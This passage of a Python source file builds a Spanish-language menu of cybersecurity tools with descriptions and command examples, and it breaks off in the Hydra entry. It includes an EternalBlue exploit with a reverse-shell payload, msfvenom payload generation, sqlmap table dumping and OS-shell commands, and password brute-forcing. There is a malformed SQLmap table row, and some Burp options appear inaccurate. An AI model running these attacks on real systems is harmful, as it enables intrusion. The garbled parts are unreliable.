'''
El alcance de este programa es:
 - Mostrar 10 campos relacionados con la ciberseguridad:
    1. Mostrar información del campo.
    2. Acceder a herramientas de CLI relacionadas con ese campo. Mostrando las opciones:
           a) Información general de la herramienta.
           b) Requisitos:
               1- SO
               2- Dependencias de otros programas.
               3- Otros requisitos.
	       c) Comandos y ejemplos de uso.
           d) Información oficial del programa.
    3. Salir del programa.
'''


#Los modulos necesarios para el programa:

import os
from tabulate import tabulate

# Definición del diccionario modules que alberga toda la información de los campos
# y de las herramientas

modules = {
    "1": {
        "name": "Análisis de Vulnerabilidades",
        "description": "Herramientas para identificar, evaluar y reportar vulnerabilidades en sistemas y redes, ayudando a mejorar la seguridad general de la infraestructura.",
        "submodules": {
            "1.1": {
                "name": "Nmap",
                "description": "Nmap (Network Mapper) es una herramienta de código abierto para exploración de redes y auditoría de seguridad. Se utiliza para descubrir hosts, servicios, sistemas operativos, y detectar vulnerabilidades potenciales.",
                "requisitos": "Compatible con sistemas Windows, Linux, y macOS. No requiere instalación en la mayoría de sistemas Unix. Se recomienda ejecutar con privilegios de administrador para acceso completo a todas las funcionalidades.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["nmap", "Escaneo básico de un host", "nmap 192.168.1.1"],
                    ["nmap -p-", "Escanea todos los puertos", "nmap -p- 192.168.1.1"],
                    ["nmap -sV", "Detecta versiones de servicios", "nmap -sV 192.168.1.1"],
                    ["nmap -O", "Detecta el sistema operativo", "nmap -O 192.168.1.1"],
                    ["nmap -sC", "Utiliza scripts por defecto", "nmap -sC 192.168.1.1"]
                ],
                "ejemplos_uso": "1. Escaneo rápido de red:\nnmap 192.168.1.0/24\n\n2. Escaneo detallado de un host:\nnmap -sV -sC -p- -O 192.168.1.100\n\n3. Escaneo sigiloso con SYN:\nnmap -sS 192.168.1.1\n\n4. Detectar servicios vulnerables:\nnmap --script vuln 192.168.1.1\n\n5. Guardar resultados en formato XML:\nnmap -sV 192.168.1.1 -oX resultado.xml",
                "documentation": "Para obtener información más detallada sobre Nmap, consulte la documentación oficial en https://nmap.org/book/man.html"
            },
            "1.2": {
                "name": "OpenVAS",
                "description": "OpenVAS (Open Vulnerability Assessment System) es un escáner de vulnerabilidades completo y de código abierto. Realiza pruebas de seguridad en sistemas y redes para identificar vulnerabilidades conocidas.",
                "requisitos": "Principalmente diseñado para sistemas Linux. Requiere una configuración inicial compleja. Se recomienda al menos 4GB de RAM y espacio en disco suficiente para las bases de datos de vulnerabilidades.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["openvas-setup", "Configura OpenVAS por primera vez", "openvas-setup"],
                    ["openvas-start", "Inicia los servicios de OpenVAS", "openvas-start"],
                    ["openvas-stop", "Detiene los servicios de OpenVAS", "openvas-stop"],
                    ["openvas-check-setup", "Verifica la configuración de OpenVAS", "openvas-check-setup"],
                    ["omp", "Interfaz de línea de comandos para gestionar OpenVAS", "omp -u admin -w password -G"]
                ],
                "ejemplos_uso": "1. Iniciar OpenVAS:\nsudo openvas-start\n\n2. Crear una tarea de escaneo (vía omp):\nomp -u admin -w password --xml='<create_task><name>Escaneo Red Local</name><target id=\"[ID_OBJETIVO]\"></target></create_task>'\n\n3. Iniciar un escaneo (vía omp):\nomp -u admin -w password --xml='<start_task task_id=\"[ID_TAREA]\"/>'\n\n4. Obtener resultados de un escaneo (vía omp):\nomp -u admin -w password --xml='<get_results task_id=\"[ID_TAREA]\"/>'\n\n5. Actualizar la base de datos de vulnerabilidades:\nsudo openvas-feed-update",
                "documentation": "Para obtener información más detallada sobre OpenVAS, consulte la documentación oficial en https://www.openvas.org/documentation.html"
            },
            "1.3": {
                "name": "Nikto",
                "description": "Nikto es un escáner de vulnerabilidades de código abierto que se centra en servidores web. Realiza pruebas exhaustivas contra servidores web para encontrar archivos peligrosos, configuraciones incorrectas y vulnerabilidades conocidas.",
                "requisitos": "Compatible con sistemas Unix/Linux y Windows (a través de Perl). Requiere Perl instalado. No necesita privilegios de root para la ejecución básica.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["nikto -h", "Especifica el host objetivo", "nikto -h www.ejemplo.com"],
                    ["nikto -p", "Especifica el puerto a escanear", "nikto -h www.ejemplo.com -p 443"],
                    ["nikto -ssl", "Fuerza el uso de SSL", "nikto -h www.ejemplo.com -ssl"],
                    ["nikto -Tuning", "Ajusta los tipos de pruebas", "nikto -h www.ejemplo.com -Tuning 123bde"],
                    ["nikto -o", "Guarda el resultado en un archivo", "nikto -h www.ejemplo.com -o informe.txt"]
                ],
                "ejemplos_uso": "1. Escaneo básico de un sitio web:\nnikto -h www.ejemplo.com\n\n2. Escaneo de un servidor web en un puerto no estándar:\nnikto -h www.ejemplo.com -p 8080\n\n3. Escaneo con SSL y guardado de resultados:\nnikto -h www.ejemplo.com -ssl -o informe.html -Format htm\n\n4. Escaneo enfocado en ciertas vulnerabilidades:\nnikto -h www.ejemplo.com -Tuning 123\n\n5. Escaneo con autenticación básica:\nnikto -h www.ejemplo.com -id admin:password",
                "documentation": "Para obtener información más detallada sobre Nikto, consulte la documentación oficial en https://cirt.net/Nikto2"
            }
        }
    },

    "2": {
        "name": "Análisis de Tráfico de Red",
        "description": "Herramientas para capturar, analizar y monitorear el tráfico de red en tiempo real, útiles para la detección de anomalías, diagnóstico de problemas y análisis de seguridad.",
        "submodules": {
            "2.1": {
                "name": "Wireshark",
                "description": "Wireshark es un analizador de protocolos de red ampliamente utilizado. Permite capturar y examinar interactivamente el tráfico que se ejecuta en una red informática en tiempo real.",
                "requisitos": "Compatible con sistemas Windows, macOS y Linux. No requiere privilegios de administrador para el análisis de capturas, pero sí para la captura en vivo en algunas interfaces.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["tshark", "Versión de línea de comandos de Wireshark", "tshark -i eth0"],
                    ["tshark -i", "Especifica la interfaz de captura", "tshark -i eth0"],
                    ["tshark -f", "Aplica un filtro de captura", "tshark -f 'port 80'"],
                    ["tshark -r", "Lee paquetes de un archivo", "tshark -r captura.pcap"],
                    ["tshark -Y", "Aplica un filtro de visualización", "tshark -r captura.pcap -Y 'http.request.method == \"GET\"'"]
                ],
                "ejemplos_uso": "1. Capturar tráfico en una interfaz específica:\ntshark -i eth0\n\n2. Capturar tráfico HTTP:\ntshark -i eth0 -f 'tcp port 80'\n\n3. Leer un archivo de captura y filtrar por IP:\ntshark -r captura.pcap -Y 'ip.addr == 192.168.1.100'\n\n4. Capturar y guardar en un archivo:\ntshark -i eth0 -w captura.pcap\n\n5. Mostrar solo los paquetes DNS:\ntshark -i eth0 -Y 'dns'",
                "documentation": "Para obtener información más detallada sobre Wireshark y tshark, consulte la documentación oficial en https://www.wireshark.org/docs/"
            },
            "2.2": {
                "name": "tcpdump",
                "description": "tcpdump es una herramienta de línea de comandos para capturar y analizar paquetes de red en tiempo real. Es ligera y está disponible en la mayoría de los sistemas Unix/Linux.",
                "requisitos": "Preinstalado en la mayoría de los sistemas Unix/Linux. Requiere privilegios de root o sudo para capturar paquetes.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["tcpdump -i", "Especifica la interfaz de captura", "tcpdump -i eth0"],
                    ["tcpdump -n", "No resuelve nombres de host", "tcpdump -n"],
                    ["tcpdump -v", "Modo verboso", "tcpdump -v"],
                    ["tcpdump -w", "Escribe la captura en un archivo", "tcpdump -w captura.pcap"],
                    ["tcpdump -r", "Lee paquetes de un archivo", "tcpdump -r captura.pcap"]
                ],
                "ejemplos_uso": "1. Capturar tráfico en una interfaz específica:\nsudo tcpdump -i eth0\n\n2. Capturar tráfico HTTP:\nsudo tcpdump -i eth0 'tcp port 80'\n\n3. Capturar tráfico de una IP específica:\nsudo tcpdump host 192.168.1.100\n\n4. Guardar la captura en un archivo:\nsudo tcpdump -i eth0 -w captura.pcap\n\n5. Leer y analizar un archivo de captura:\ntcpdump -r captura.pcap",
                "documentation": "Para obtener información más detallada sobre tcpdump, consulte la página del manual (man tcpdump) en sistemas Unix/Linux."
            },
            "2.3": {
                "name": "Snort",
                "description": "Snort es un sistema de detección y prevención de intrusiones (IDS/IPS) de código abierto. Puede realizar análisis de tráfico en tiempo real y registro de paquetes en redes IP.",
                "requisitos": "Compatible con sistemas Unix/Linux y Windows. Requiere privilegios de root/administrador para su ejecución. Necesita configuración de reglas para una detección efectiva.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["snort -v", "Modo verboso, muestra los encabezados de los paquetes", "snort -v"],
                    ["snort -d", "Muestra el contenido de la carga útil de los paquetes", "snort -d"],
                    ["snort -e", "Muestra los encabezados de la capa de enlace", "snort -e"],
                    ["snort -c", "Especifica el archivo de configuración", "snort -c /etc/snort/snort.conf"],
                    ["snort -r", "Lee paquetes de un archivo pcap", "snort -r captura.pcap"]
                ],
                "ejemplos_uso": "1. Ejecutar Snort en modo sniffer:\nsudo snort -v -i eth0\n\n2. Usar Snort con un archivo de configuración:\nsudo snort -c /etc/snort/snort.conf -i eth0\n\n3. Analizar un archivo de captura:\nsudo snort -r captura.pcap -c /etc/snort/snort.conf\n\n4. Ejecutar Snort en modo IDS:\nsudo snort -D -c /etc/snort/snort.conf -l /var/log/snort\n\n5. Probar reglas de Snort:\nsudo snort -T -c /etc/snort/snort.conf",
                "documentation": "Para obtener información más detallada sobre Snort, consulte la documentación oficial en https://www.snort.org/documents"
            }
        }
    },

    "3": {
        "name": "Pruebas de Penetración",
        "description": "Herramientas para realizar pruebas de penetración, simulando ataques controlados para identificar vulnerabilidades en sistemas y aplicaciones.",
        "submodules": {
            "3.1": {
                "name": "Metasploit Framework",
                "description": "Metasploit Framework es una plataforma de pruebas de penetración que proporciona una amplia gama de exploits, payloads y herramientas para descubrir, explotar y validar vulnerabilidades. Es altamente extensible y se utiliza tanto para pruebas de seguridad como para desarrollo de exploits.",
                "requisitos": "Compatible con sistemas Unix/Linux, Windows y macOS. Requiere Ruby. Se recomienda ejecutar con privilegios de root/administrador para acceder a todas las funcionalidades.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["msfconsole", "Inicia la consola interactiva de Metasploit", "msfconsole"],
                    ["use", "Selecciona un módulo para usar", "use exploit/windows/smb/ms17_010_eternalblue"],
                    ["set", "Configura opciones para el módulo seleccionado", "set RHOSTS 192.168.1.100"],
                    ["exploit", "Ejecuta el exploit configurado", "exploit"],
                    ["search", "Busca módulos disponibles", "search type:exploit platform:windows"]
                ],
                "ejemplos_uso": "1. Iniciar Metasploit y buscar un exploit:\nmsfconsole\nsearch cve:2021\n\n2. Usar y configurar un exploit:\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit\n\n3. Generar un payload:\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe\n\n4. Escanear vulnerabilidades con auxiliary modules:\nuse auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS 192.168.1.0/24\nrun",
                "documentation": "Para obtener información más detallada y actualizada sobre Metasploit Framework, consulte la documentación oficial en el sitio web de Metasploit: https://docs.metasploit.com/."
                },
            "3.2": {
                "name": "Burp Suite (versión CLI)",
                "description": "Burp Suite es una plataforma integrada para realizar pruebas de seguridad en aplicaciones web. Aunque es principalmente conocida por su interfaz gráfica, también ofrece funcionalidades a través de línea de comandos para automatización y integración en flujos de trabajo.",
                "requisitos": "Compatible con sistemas que soporten Java. Requiere Java Runtime Environment (JRE) 1.8 o superior. La versión CLI está disponible en la edición Professional.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["java -jar burpsuite_pro.jar", "Inicia Burp Suite en modo headless", "java -jar burpsuite_pro.jar --headless"],
                    ["--project-file", "Especifica un archivo de proyecto", "java -jar burpsuite_pro.jar --project-file=mi_proyecto.burp"],
                    ["--config-file", "Usa un archivo de configuración", "java -jar burpsuite_pro.jar --config-file=config.json"],
                    ["--user-config-file", "Especifica un archivo de configuración de usuario", "java -jar burpsuite_pro.jar --user-config-file=user_config.json"],
                    ["--command", "Ejecuta un comando específico", "java -jar burpsuite_pro.jar --command=scan --url=http://example.com"]
                ],
                "ejemplos_uso": "1. Iniciar un escaneo automático:\njava -jar burpsuite_pro.jar --headless --project-file=proyecto.burp --config-file=config.json --command=scan --url=http://example.com\n\n2. Generar un reporte de vulnerabilidades:\njava -jar burpsuite_pro.jar --headless --project-file=proyecto.burp --command=generate_report --report-file=reporte.html\n\n3. Importar un sitemap:\njava -jar burpsuite_pro.jar --headless --project-file=proyecto.burp --command=import_site_map --file-path=sitemap.xml\n\n4. Ejecutar un escaneo pasivo:\njava -jar burpsuite_pro.jar --headless --project-file=proyecto.burp --command=passive_scan --url=http://example.com",
                "documentation": "Para obtener información más detallada y actualizada sobre Burp Suite CLI, consulte la documentación oficial en el sitio web de PortSwigger en https://portswigger.net/burp/documentation/desktop/troubleshooting/launch-from-command-line."
            },
            "3.3": {
                "name": "SQLmap",
                "description": "SQLmap es una herramienta de código abierto diseñada para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web. Automatiza el proceso de identificación y explotación de inyecciones SQL, permitiendo a los probadores de penetración evaluar la seguridad de las bases de datos.",
                "requisitos": "Compatible con sistemas Unix/Linux, Windows y macOS. Requiere Python 2.6, 2.7 o 3.x. No necesita privilegios de root para la mayoría de las funciones, pero algunos tests avanzados pueden requerirlos.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["sqlmap -u", "Especifica la URL objetivo", "sqlmap -u", "Especifica la URL objetivo", 'sqlmap -u "http://example.com/page.php?id=1"'],
                    ["sqlmap -r", "Lee la petición desde un archivo", "sqlmap -r request.txt"],
                    ["sqlmap --dbs", "Enumera las bases de datos", 'sqlmap -u "http://example.com/page.php?id=1" --dbs'],
                    ["sqlmap -D", "Especifica la base de datos objetivo", 'sqlmap -u "http://example.com/page.php?id=1" -D testdb --tables'],
                    ["sqlmap --batch", "Ejecuta en modo no interactivo", 'sqlmap -u "http://example.com/page.php?id=1" --batch']
                ],
                "ejemplos_uso": '1. Detectar inyección SQL en una URL:\nsqlmap -u "http://example.com/page.php?id=1" --batch\n\n2. Extraer bases de datos de un sitio vulnerable:\nsqlmap -u "http://example.com/page.php?id=1" --dbs --batch\n\n3. Dumpear tablas de una base de datos específica:\nsqlmap -u "http://example.com/page.php?id=1" -D nombredb --tables --dump\n\n4. Usar un archivo de petición HTTP y buscar inyecciones en los headers:\nsqlmap -r login_request.txt --level=3 --risk=3\n\n5. Ejecutar comandos del sistema operativo:\nsqlmap -u "http://example.com/page.php?id=1" --os-shell',
                "documentation": "Para obtener información más detallada y actualizada sobre SQLmap, consulte la documentación oficial en el repositorio de GitHub de SQLmap en https://github.com/sqlmapproject/sqlmap."
            }
            }
        },

    "4": {
        "name": "Análisis Forense",
        "description": "Herramientas para el análisis forense digital, que permiten examinar y recuperar evidencias de sistemas y dispositivos informáticos.",
        "submodules": {
            "4.1": {
                "name": "Volatility",
                "description": "Volatility es un framework de código abierto para el análisis forense de memoria volátil. Permite extraer artefactos digitales de muestras de memoria RAM, proporcionando información valiosa sobre el estado del sistema en el momento de la captura.",
                "requisitos": "Compatible con sistemas Windows, Linux y macOS. Requiere Python. Se recomienda tener al menos 4GB de RAM disponible para el análisis de muestras de memoria grandes.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["volatility -f", "Especifica el archivo de memoria a analizar", "volatility -f memoria.raw"],
                    ["volatility --profile", "Selecciona el perfil del sistema operativo", "volatility --profile=Win10x64_18362 -f memoria.raw"],
                    ["volatility pslist", "Lista los procesos en ejecución", "volatility -f memoria.raw --profile=Win10x64_18362 pslist"],
                    ["volatility filescan", "Busca archivos en la memoria", "volatility -f memoria.raw --profile=Win10x64_18362 filescan"],
                    ["volatility netscan", "Muestra conexiones de red activas", "volatility -f memoria.raw --profile=Win10x64_18362 netscan"]
                ],
                "ejemplos_uso": "1. Identificar procesos maliciosos:\nvolatility -f memoria.raw --profile=Win10x64_18362 malfind\n\n2. Extraer claves del registro:\nvolatility -f memoria.raw --profile=Win10x64_18362 hivelist\nvolatility -f memoria.raw --profile=Win10x64_18362 printkey -K 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n\n3. Analizar conexiones de red sospechosas:\nvolatility -f memoria.raw --profile=Win10x64_18362 netscan | grep ESTABLISHED\n\n4. Buscar evidencias de inyección de código:\nvolatility -f memoria.raw --profile=Win10x64_18362 malfind -D dumpedfiles/",
                "documentation": "Para obtener información más detallada y actualizada sobre Volatility, consulte la documentación oficial en https://github.com/volatilityfoundation/volatility/wiki"
            },
            "4.2": {
                "name": "Autopsy (versión CLI)",
                "description": "Autopsy es una plataforma forense digital de código abierto que proporciona una interfaz gráfica para The Sleuth Kit. La versión CLI permite realizar análisis forenses desde la línea de comandos, lo que es útil para la automatización y el procesamiento por lotes.",
                "requisitos": "Compatible con sistemas Windows, Linux y macOS. Requiere Java Runtime Environment (JRE) 8 o superior. Se recomienda un mínimo de 8GB de RAM para casos pequeños, 16GB o más para casos más grandes.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["autopsy --createCase", "Crea un nuevo caso", "autopsy --createCase --caseName=MiCaso --caseBaseDir=/casos"],
                    ["autopsy --addDataSource", "Añade una fuente de datos al caso", "autopsy --caseDir=/casos/MiCaso --addDataSource --dataSourcePath=/evidencia/disco.dd"],
                    ["autopsy --runIngest", "Ejecuta módulos de ingestión", "autopsy --caseDir=/casos/MiCaso --runIngest"],
                    ["autopsy --listAllDataSources", "Lista todas las fuentes de datos en un caso", "autopsy --caseDir=/casos/MiCaso --listAllDataSources"],
                    ["autopsy --generateReports", "Genera informes del caso", "autopsy --caseDir=/casos/MiCaso --generateReports"]
                ],
                "ejemplos_uso": "1. Crear un nuevo caso y añadir una imagen de disco:\nautopsy --createCase --caseName=CasoPhishing --caseBaseDir=/casos\nautopsy --caseDir=/casos/CasoPhishing --addDataSource --dataSourcePath=/evidencia/laptop.dd\n\n2. Ejecutar análisis de ingestión en todas las fuentes de datos:\nautopsy --caseDir=/casos/CasoPhishing --runIngest\n\n3. Generar un informe HTML del caso:\nautopsy --caseDir=/casos/CasoPhishing --generateReports --reportType=HTML\n\n4. Listar todas las fuentes de datos en un caso existente:\nautopsy --caseDir=/casos/CasoPhishing --listAllDataSources",
                "documentation": "Para obtener información más detallada sobre Autopsy CLI, consulte la documentación oficial en https://sleuthkit.org/autopsy/docs/user-docs/4.19.3/command_line_ingest_page.html"
            },
            "4.3": {
                "name": "The Sleuth Kit",
                "description": "The Sleuth Kit (TSK) es una colección de herramientas de línea de comandos y una biblioteca C que permite analizar imágenes de disco y recuperar archivos. Es utilizado por Autopsy y muchas otras herramientas forenses de código abierto y comerciales.",
                "requisitos": "Compatible con sistemas Unix/Linux y Windows (a través de Cygwin). No requiere instalación adicional en la mayoría de las distribuciones Linux forenses. Se recomienda familiaridad con la línea de comandos.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["mmls", "Muestra la estructura de particiones", "mmls imagen_disco.dd"],
                    ["fls", "Lista archivos y directorios", "fls -r imagen_disco.dd"],
                    ["icat", "Extrae contenido de un archivo por número de inodo", "icat imagen_disco.dd 123456 > archivo_extraido"],
                    ["blkcat", "Muestra contenido de bloques de datos", "blkcat imagen_disco.dd 1024"],
                    ["mactime", "Crea una línea de tiempo de actividad de archivos", "mactime -b body.txt"]
                ],
                "ejemplos_uso": "1. Analizar la estructura de particiones de una imagen:\nmmls imagen_disco.dd\n\n2. Listar archivos eliminados en una partición:\nfls -rd imagen_disco.dd 2048\n\n3. Extraer un archivo específico por su número de inodo:\nicat imagen_disco.dd 123456 > archivo_sospechoso.exe\n\n4. Crear una línea de tiempo de actividad de archivos:\nfls -m C: imagen_disco.dd > body.txt\nmactime -b body.txt > timeline.csv\n\n5. Buscar una cadena específica en la imagen:\nblkls imagen_disco.dd | strings | grep 'contraseña'",
                "documentation": "Para obtener información más detallada sobre The Sleuth Kit, consulte la documentación oficial en https://wiki.sleuthkit.org/index.php?title=TSK_Tool_Overview"
            }
        }
    },

    "5": {
        "name": "Criptografía y Seguridad de Datos",
        "description": "Herramientas para cifrar, descifrar y proteger datos sensibles, así como para gestionar certificados y firmas digitales.",
        "submodules": {
            "5.1": {
                "name": "OpenSSL",
                "description": "OpenSSL es una herramienta de código abierto que implementa los protocolos SSL y TLS. Se utiliza para generar certificados, claves, firmas digitales y realizar operaciones criptográficas.",
                "requisitos": "Compatible con sistemas Unix/Linux, Windows y macOS. No requiere privilegios de administrador para la mayoría de las operaciones, pero algunas funciones pueden necesitar permisos elevados.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["openssl genrsa", "Genera una clave privada RSA", "openssl genrsa -out private.key 2048"],
                    ["openssl rsa", "Maneja claves RSA", "openssl rsa -in private.key -pubout -out public.key"],
                    ["openssl req", "Crea y procesa solicitudes de certificados", "openssl req -new -key private.key -out cert.csr"],
                    ["openssl x509", "Gestiona certificados X.509", "openssl x509 -in cert.pem -text -noout"],
                    ["openssl enc", "Cifra y descifra datos", "openssl enc -aes-256-cbc -in file.txt -out file.enc"]
                ],
                "ejemplos_uso": "1. Generar un par de claves RSA:\nopenssl genrsa -out private.key 2048\nopenssl rsa -in private.key -pubout -out public.key\n\n2. Crear un certificado autofirmado:\nopenssl req -x509 -new -key private.key -out cert.pem -days 365\n\n3. Cifrar un archivo:\nopenssl enc -aes-256-cbc -salt -in secreto.txt -out secreto.enc\n\n4. Descifrar un archivo:\nopenssl enc -d -aes-256-cbc -in secreto.enc -out secreto_descifrado.txt",
                "documentation": "Para obtener información más detallada sobre OpenSSL, consulte la documentación oficial en https://www.openssl.org/docs/"
            },
            "5.2": {
                "name": "GnuPG",
                "description": "GnuPG (GNU Privacy Guard) es una implementación completa y libre del estándar OpenPGP. Se utiliza para cifrar y firmar datos y comunicaciones.",
                "requisitos": "Compatible con sistemas Unix/Linux, Windows y macOS. No requiere privilegios especiales para la mayoría de las operaciones.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["gpg --gen-key", "Genera un nuevo par de claves", "gpg --gen-key"],
                    ["gpg --encrypt", "Cifra datos", "gpg --encrypt --recipient usuario@ejemplo.com archivo.txt"],
                    ["gpg --decrypt", "Descifra datos", "gpg --decrypt archivo.gpg"],
                    ["gpg --sign", "Firma datos", "gpg --sign documento.txt"],
                    ["gpg --verify", "Verifica una firma", "gpg --verify documento.txt.sig"]
                ],
                "ejemplos_uso": "1. Generar un par de claves:\ngpg --gen-key\n\n2. Cifrar un archivo para un destinatario específico:\ngpg --encrypt --recipient usuario@ejemplo.com archivo_secreto.txt\n\n3. Descifrar un archivo recibido:\ngpg --decrypt archivo_cifrado.gpg > archivo_descifrado.txt\n\n4. Firmar un documento:\ngpg --sign documento_importante.txt\n\n5. Verificar la firma de un documento:\ngpg --verify documento_firmado.txt.sig documento_firmado.txt",
                "documentation": "Para obtener información más detallada sobre GnuPG, consulte la documentación oficial en https://gnupg.org/documentation/"
            },
            "5.3": {
                "name": "VeraCrypt (versión CLI)",
                "description": "VeraCrypt es una herramienta de cifrado de disco completo y creación de volúmenes cifrados. La versión CLI permite su uso desde la línea de comandos para automatización y scripts.",
                "requisitos": "Compatible con sistemas Windows, Linux y macOS. Requiere privilegios de administrador para la mayoría de las operaciones, especialmente para montar volúmenes.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["veracrypt --create", "Crea un nuevo volumen cifrado", "veracrypt --create volumen.vc"],
                    ["veracrypt --mount", "Monta un volumen cifrado", "veracrypt --mount volumen.vc /mnt/cifrado"],
                    ["veracrypt --dismount", "Desmonta un volumen cifrado", "veracrypt --dismount /mnt/cifrado"],
                    ["veracrypt --volume-properties", "Muestra propiedades del volumen", "veracrypt --volume-properties volumen.vc"],
                    ["veracrypt --encryption", "Especifica algoritmo de cifrado", "veracrypt --encryption AES --hash SHA-512 --create volumen.vc"]
                ],
                "ejemplos_uso": "1. Crear un nuevo volumen cifrado de 100MB:\nveracrypt --create volumen.vc --size 100M --password MiContraseña --encryption AES --filesystem FAT\n\n2. Montar un volumen cifrado:\nveracrypt --mount volumen.vc /mnt/cifrado --password MiContraseña\n\n3. Copiar archivos al volumen montado:\ncp archivos_secretos/* /mnt/cifrado/\n\n4. Desmontar el volumen cifrado:\nveracrypt --dismount /mnt/cifrado\n\n5. Cambiar la contraseña de un volumen:\nveracrypt --change-password volumen.vc",
                "documentation": "Para obtener información más detallada sobre VeraCrypt CLI, consulte la documentación oficial en https://www.veracrypt.fr/en/Command%20Line%20Usage.html"
            }
        }
    },

    "6": {
        "name": "Seguridad de Contraseñas",
        "description": "Herramientas para evaluar y probar la fortaleza de contraseñas, así como para realizar ataques de fuerza bruta y diccionario contra sistemas de autenticación.",
        "submodules": {
            "6.1": {
                "name": "John the Ripper",
                "description": "John the Ripper es una herramienta de código abierto diseñada para descifrar contraseñas. Es ampliamente utilizada por investigadores de seguridad, pentesters y profesionales de la ciberseguridad para realizar ataques de fuerza bruta y de diccionario, así como para evaluar la fortaleza de las contraseñas.",
                "requisitos": "Compatible con sistemas Unix/Linux, Windows y macOS. No requiere privilegios especiales para la mayoría de las operaciones, pero algunas funciones avanzadas pueden necesitar permisos de administrador.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["john", "Inicia el proceso de crackeo", "john passwords.txt"],
                    ["john --wordlist", "Usa un diccionario específico", "john --wordlist=diccionario.txt hash.txt"],
                    ["john --format", "Especifica el formato de hash", "john --format=raw-md5 hash.txt"],
                    ["john --show", "Muestra las contraseñas descifradas", "john --show passwords.txt"],
                    ["john --incremental", "Usa el modo incremental", "john --incremental hash.txt"]
                ],
                "ejemplos_uso": "1. Crackear un archivo de contraseñas:\njohn passwords.txt\n\n2. Usar un diccionario específico:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n3. Especificar el formato de hash:\njohn --format=raw-md5 hash.txt\n\n4. Mostrar las contraseñas descifradas:\njohn --show passwords.txt\n\n5. Usar el modo incremental para un ataque de fuerza bruta:\njohn --incremental hash.txt",
                "documentation": "Para obtener información más detallada sobre John the Ripper, consulte la documentación oficial en https://www.openwall.com/john/doc/"
            },
            "6.2": {
                "name": "Hashcat",
                "description": "Hashcat es una herramienta avanzada de recuperación de contraseñas que utiliza la potencia de procesamiento de CPUs y GPUs para realizar ataques de fuerza bruta y de diccionario a alta velocidad. Soporta una amplia variedad de algoritmos de hash.",
                "requisitos": "Compatible con sistemas Linux, Windows y macOS. Requiere controladores actualizados de GPU para un rendimiento óptimo. Se recomienda una GPU potente para ataques de alta velocidad.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["hashcat -m", "Especifica el modo de hash", "hashcat -m 0 hash.txt wordlist.txt"],
                    ["hashcat -a", "Especifica el modo de ataque", "hashcat -a 3 -m 0 hash.txt"],
                    ["hashcat -o", "Especifica el archivo de salida", "hashcat -m 0 hash.txt wordlist.txt -o cracked.txt"],
                    ["hashcat --show", "Muestra los resultados", "hashcat --show hash.txt"],
                    ["hashcat -r", "Usa un archivo de reglas", "hashcat -m 0 -r rules/best64.rule hash.txt wordlist.txt"]
                ],
                "ejemplos_uso": "1. Ataque de diccionario a un hash MD5:\nhashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n\n2. Ataque de fuerza bruta a un hash SHA-256:\nhashcat -m 1400 -a 3 hash.txt ?a?a?a?a?a?a\n\n3. Usar reglas para modificar palabras del diccionario:\nhashcat -m 0 -a 0 -r rules/best64.rule hash.txt wordlist.txt\n\n4. Ataque de máscara a un hash WPA:\nhashcat -m 2500 -a 3 capture.hccapx ?d?d?d?d?d?d?d?d\n\n5. Mostrar los resultados de un ataque previo:\nhashcat --show hash.txt",
                "documentation": "Para obtener información más detallada sobre Hashcat, consulte la documentación oficial en https://hashcat.net/wiki/"
            },
            "6.3": {
                "name": "Hydra",
                "description": "Hydra es una herramienta de cracking de contraseñas en línea que permite realizar ataques de fuerza bruta contra diversos protocolos y servicios de red. Es especialmente útil para probar la seguridad de sistemas de autenticación remotos.",
                "requisitos": "Compatible con sistemas Unix/Linux y Windows. Requiere privilegios de administrador para algunas operaciones. Se recomienda una conexión de red estable para ataques remotos.",
                "tabla_comandos": [
                    ["Comando", "Descripción", "Ejemplo"],
                    ["hydra -l", "Especifica un nombre de usuario", "hydra -l admin ftp://10.10.10.10"],
                    ["hydra -L", "Usa una lista de usuarios", "hydra -L users.txt ftp://10.10.10.10"],
                    ["hydra -p", "Especifica una contraseña", "hydra -l admin -p password ssh://10.10.10.10"],
                    ["hydra -P", "Usa una lista de contraseñas", "hydra -l admin -P passwords.txt ssh://10.10.10.10"],
                    ["hydra -t", "Establece el número de tareas paralelas", "hydra -t 4 -l admin -P passwords.txt ftp://10.10.10.10"]
                ],
